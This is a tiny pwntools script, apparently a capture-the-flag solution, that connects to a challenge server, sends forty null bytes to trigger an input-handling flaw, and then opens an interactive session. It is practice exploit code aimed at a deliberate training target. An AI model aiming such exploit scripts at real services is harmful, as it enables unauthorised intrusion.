from pwn import *
context.log_level="debug"

p = remote("challs.sieberrsec.tech", 3476)

#a null byte is b"\x00"
p.sendline(b"\x00"*40)

p.interactive()
